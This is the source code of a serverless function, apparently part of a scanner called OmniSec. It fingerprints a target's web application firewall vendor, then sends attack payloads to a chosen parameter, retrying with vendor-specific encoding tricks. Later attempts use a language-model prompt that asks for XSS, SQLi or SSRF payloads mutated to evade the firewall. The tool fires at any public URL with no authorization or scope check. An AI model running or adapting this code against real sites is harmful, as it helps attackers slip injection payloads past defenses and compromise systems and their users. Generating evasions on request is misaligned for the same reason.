// OmniSec™ © HARSH MALIK — WAF Fingerprint + Adaptive Bypass + AI Payload Retry
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

type WafVendor = "cloudflare" | "akamai" | "aws" | "imperva" | "sucuri" | "f5" | "fastly" | "azure" | "none";

function fingerprintWaf(headers: Headers, body: string, status: number): { vendor: WafVendor; confidence: number; signals: string[] } {
  const signals: string[] = [];
  const h = Object.fromEntries(headers.entries());
  const server = (h["server"] || "").toLowerCase();
  const all = JSON.stringify(h).toLowerCase() + " " + body.slice(0, 2000).toLowerCase();

  if (/cloudflare/.test(server) || h["cf-ray"] || /__cfduid|cf-mitigated/.test(all)) { signals.push("cf-ray"); return { vendor: "cloudflare", confidence: 0.95, signals }; }
  if (h["x-akamai-transformed"] || /akamaighost/.test(server) || /reference\s*#\d+\.[a-f0-9]+/.test(body)) { signals.push("akamai-header"); return { vendor: "akamai", confidence: 0.9, signals }; }
  if (h["x-amzn-requestid"] || /awselb|x-amz-cf-id/.test(all) || (status === 403 && /aws/.test(all))) { signals.push("aws-waf"); return { vendor: "aws", confidence: 0.8, signals }; }
  if (/incapsula|imperva/.test(all) || h["x-iinfo"]) { signals.push("imperva"); return { vendor: "imperva", confidence: 0.9, signals }; }
  if (/sucuri/.test(all) || h["x-sucuri-id"]) { signals.push("sucuri"); return { vendor: "sucuri", confidence: 0.9, signals }; }
  if (/big-?ip|f5/.test(all) || h["x-wa-info"]) { signals.push("f5"); return { vendor: "f5", confidence: 0.8, signals }; }
  if (/fastly/.test(server) || h["fastly-debug-digest"]) { signals.push("fastly"); return { vendor: "fastly", confidence: 0.85, signals }; }
  if (/azurewebsites|x-azure-ref/.test(all)) { signals.push("azure"); return { vendor: "azure", confidence: 0.8, signals }; }
  return { vendor: "none", confidence: 0, signals };
}

// Per-vendor encoder profile
function encodePayload(payload: string, vendor: WafVendor, round: number): string {
  const p = payload;
  switch (vendor) {
    case "cloudflare":
      if (round === 1) return p.replace(/</g, "%253C").replace(/>/g, "%253E");
      if (round === 2) return p.split("").map(c => /[a-z]/i.test(c) ? `&#${c.charCodeAt(0)};` : c).join("");
      if (round === 3) return p.replace(/script/gi, "scr/**/ipt");
      return p.replace(/ /g, "/**/");
    case "akamai":
      if (round === 1) return encodeURIComponent(encodeURIComponent(p));
      if (round === 2) return p.replace(/select/gi, "sEl%65ct").replace(/union/gi, "uNi%6Fn");
      return p.replace(/'/g, "%u0027").replace(/"/g, "%u0022");
    case "aws":
      if (round === 1) return p.replace(/=/g, "%3d").replace(/&/g, "%26");
      if (round === 2) return p.split("").map(c => c.charCodeAt(0) > 32 ? `\\u00${c.charCodeAt(0).toString(16).padStart(2, "0")}` : c).join("");
      return p.replace(/\s+/g, "+");
    case "imperva":
      if (round === 1) return p.replace(/(.)/g, (m) => Math.random() > 0.5 ? m.toUpperCase() : m.toLowerCase());
      return p.replace(/</g, "<%00").replace(/>/g, "%00>");
    default:
      return encodeURIComponent(p);
  }
}

async function aiMutate(originalPayload: string, vendor: string, blockedResponseSnippet: string, attempt: number): Promise<string> {
  const key = Deno.env.get("LOVABLE_API_KEY");
  if (!key) return originalPayload;
  const prompt = `You are a WAF-evasion payload mutator. The WAF "${vendor}" blocked this payload:
PAYLOAD: ${originalPayload}
RESPONSE SNIPPET: ${blockedResponseSnippet.slice(0, 400)}
Attempt #${attempt}. Output ONE mutated payload (no explanation) that preserves the original attack semantics (XSS, SQLi, SSRF, etc.) but evades the WAF using techniques like: case toggling, encoding (url/double-url/unicode/hex), comment injection, whitespace tricks, alternative syntax, fragmentation. Just the payload, no quotes or markdown.`;
  try {
    const r = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-3-flash-preview",
        messages: [{ role: "user", content: prompt }],
      }),
    });
    if (!r.ok) return originalPayload;
    const j = await r.json();
    const out = j.choices?.[0]?.message?.content?.trim();
    return out || originalPayload;
  } catch {
    return originalPayload;
  }
}

interface ProbeReq {
  scanId?: string;
  targetUrl: string;
  parameter?: string;
  payload?: string;
  method?: "GET" | "POST";
  maxAttempts?: number;
}

async function emit(supabase: any, scanId: string | undefined, message: string, phase = "waf-bypass") {
  if (!scanId) return;
  try {
    await supabase.from("scan_progress").insert({
      scan_id: scanId, phase, phase_number: 14, total_phases: 16, progress: -1,
      message, findings_so_far: 0, endpoints_discovered: 0,
    });
  } catch {}
}

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
  try {
    const supabase = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
    const body: ProbeReq = await req.json();
    const { scanId, targetUrl, parameter, payload, method = "GET", maxAttempts = 5 } = body;
    if (!targetUrl) return new Response(JSON.stringify({ error: "targetUrl required" }), { status: 400, headers: corsHeaders });

    // SSRF guard
    const u = new URL(targetUrl);
    if (/^(127\.|10\.|192\.168\.|169\.254\.|localhost)/i.test(u.hostname)) {
      return new Response(JSON.stringify({ error: "private host blocked" }), { status: 400, headers: corsHeaders });
    }

    // 1) Baseline probe to fingerprint
    const baselineResp = await fetch(targetUrl, { method: "GET", redirect: "manual", signal: AbortSignal.timeout(10000) });
    const baselineBody = await baselineResp.text().catch(() => "");
    const fp = fingerprintWaf(baselineResp.headers, baselineBody, baselineResp.status);
    await emit(supabase, scanId, `🛡️ WAF detected: ${fp.vendor} (conf ${fp.confidence})`);

    if (!payload || !parameter) {
      return new Response(JSON.stringify({ waf: fp }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // 2) Adaptive retry loop
    const attempts: any[] = [];
    let current = payload;
    let success = false;
    for (let i = 1; i <= maxAttempts; i++) {
      const mutated = i === 1 ? current : (i <= 3 ? encodePayload(current, fp.vendor, i - 1) : await aiMutate(current, fp.vendor, attempts[attempts.length - 1]?.snippet || "", i));
      const url = new URL(targetUrl);
      let resp: Response;
      try {
        if (method === "GET") {
          url.searchParams.set(parameter, mutated);
          resp = await fetch(url.toString(), { redirect: "manual", signal: AbortSignal.timeout(8000) });
        } else {
          const fd = new URLSearchParams(); fd.set(parameter, mutated);
          resp = await fetch(targetUrl, { method: "POST", body: fd, redirect: "manual", signal: AbortSignal.timeout(8000) });
        }
      } catch (e) {
        attempts.push({ attempt: i, payload: mutated, error: String(e) });
        continue;
      }
      const rb = await resp.text().catch(() => "");
      const blocked = resp.status === 403 || resp.status === 406 || resp.status === 429 || /blocked|forbidden|access denied|reference #/i.test(rb.slice(0, 500));
      attempts.push({ attempt: i, payload: mutated, status: resp.status, blocked, snippet: rb.slice(0, 300) });
      await emit(supabase, scanId, `🧬 Attempt ${i}/${maxAttempts} status=${resp.status} blocked=${blocked}`);
      if (!blocked) { success = true; current = mutated; break; }
    }

    return new Response(JSON.stringify({ waf: fp, success, attempts, finalPayload: current }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : String(e) }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
